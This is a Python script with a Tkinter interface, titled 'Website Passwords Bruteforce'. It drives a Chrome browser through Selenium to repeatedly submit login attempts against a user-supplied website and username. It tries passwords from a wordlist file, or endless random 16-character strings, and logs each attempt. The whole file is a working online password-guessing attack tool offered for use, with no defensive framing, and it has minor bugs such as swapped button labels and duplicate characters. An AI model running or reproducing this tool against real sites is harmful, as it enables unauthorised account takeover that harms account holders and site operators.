# [---Imports---]
import datetime
import random
import time
from tkinter import *
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# [---Initializations---]
passwords = []
letters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v",
           "w", "x", "y", "z",
           "A", "B", "C", "D", "E", "F", "G", "H", "I", "G", "K", "L", "M", "n", "O", "P", "Q", "R", "S", "T", "U", "V",
           "W", "X", "Y", "Z",
           "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
           "@", "#", "*", "@", "#", "*", "@", "#", "*"]
with open('Passwords.txt', "r") as s:
    for i in s:
        passwords.append(i)


# [---Logs-Logic---]
def Log_writing(log_password, log_username):
    with open('Butting_logs.log', 'w') as log_document:
        log_document.write(f"---------------------------------\n"
                           f"Username: {log_username}\n"
                           f"Password: {log_password}\n"
                           f"Current date: {datetime.datetime.now().strftime('%Y-%m-%d')}\n"
                           f"Current time: {datetime.datetime.now().strftime('%H:%M:%S')}\n"
                           f"---------------------------------\n")
        log_document.close()


# [---Main-Logic---]
def brute(Password_):
    pas = Password_field.get()
    log = Login_field.get()
    sub = Button_field.get()
    Current_Username = Username_field.get()
    username = driver.find_element(By.ID, log)
    username.clear()
    username.send_keys(Current_Username)
    password = driver.find_element(By.ID, pas)
    password.clear()
    Log_writing(Password_, Current_Username)
    password.send_keys(Password_)
    driver.find_element(By.CLASS_NAME, sub).click()


# [---Bruteforce-from-document-mode---]
def Start_document_mode():
    url = Link_field.get()
    driver.get(url)
    for Current_index in range(len(passwords)):
        brute(passwords[Current_index])
        Current_index += 1
        if Current_index == passwords[-1]:
            break


# [---Bruteforce-random-mode---]
def Start_random_mode():
    b = []
    url = Link_field.get()
    driver.get(url)
    while True:
        for appending in range(16):
            c = random.choice(letters)
            b.append(c)
            if len(b) == 16:
                lk = "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}".format(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
                                                               b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15])
                b = []
                time.sleep(0.1)
                brute(lk)


# [---Activation---]
driver = webdriver.Chrome(executable_path=r'chromedriver.exe')
chrome_options = Options()

# [---Menu-code---]
Bruteforce = Tk()
Bruteforce.title('Website Passwords Bruteforce')
Bruteforce.geometry('400x400')
Bruteforce.config(bg='black')
Bruteforce.resizable(False, False)

Title = Label(text='Password bruter for site',
              bg='black',
              fg='white smoke',
              font='Arial 14 bold')

Link_label = Label(text='Please enter site link',
                   bg='black',
                   fg='white smoke',
                   font='Arial 8 bold')

Link_field = Entry(bg='gray45',
                   fg='white smoke',
                   font='Arial 10 bold',
                   width=45,
                   relief=RAISED)

Username_label = Label(text='Please enter Username',
                       bg='black',
                       fg='white smoke',
                       font='Arial 8 bold')

Username_field = Entry(bg='gray45',
                       fg='white smoke',
                       font='Arial 10 bold',
                       width=45,
                       relief=RAISED)

Login_label = Label(text='Please enter name or id of Login field',
                    bg='black',
                    fg='white smoke',
                    font='Arial 8 bold')

Login_field = Entry(bg='gray45',
                    fg='white smoke',
                    font='Arial 10 bold',
                    width=45,
                    relief=RAISED)

Password_label = Label(text='Please enter name or id of Password field',
                       bg='black',
                       fg='white smoke',
                       font='Arial 8 bold')

Password_field = Entry(bg='gray45',
                       fg='white smoke',
                       font='Arial 10 bold',
                       width=45,
                       relief=RAISED)

Button_label = Label(text='Please enter class name of Confirm button',
                     bg='black',
                     fg='white smoke',
                     font='Arial 8 bold')

Button_field = Entry(bg='gray45',
                     fg='white smoke',
                     font='Arial 10 bold',
                     width=45,
                     relief=RAISED)

Random_Mode_Button = Button(text='Document brute',
                            bg='gray45',
                            fg='white smoke',
                            font='Arial 8 bold',
                            command=Start_document_mode,
                            relief=RAISED)

Document_Mode_Button = Button(text='Random brute',
                              bg='gray45',
                              fg='white smoke',
                              font='Arial 8 bold',
                              command=Start_random_mode,
                              relief=RAISED)
PS = Label(text='P.S. Type of password field and login field must be same!!!',
           bg='black',
           fg='red2',
           font='Arial 10 bold')

Title.pack()
Link_label.pack()
Link_field.pack()
Username_label.pack()
Username_field.pack()
Login_label.pack()
Login_field.pack()
Password_label.pack()
Password_field.pack()
Button_label.pack()
Button_field.pack()
Random_Mode_Button.pack(pady=3)
Document_Mode_Button.pack(pady=1)
PS.pack()
Bruteforce.mainloop()

# ------------------------------------------------------------
# By Dolor 23.04.2022
# https://github.com/AngelZariel/
# ------------------------------------------------------------
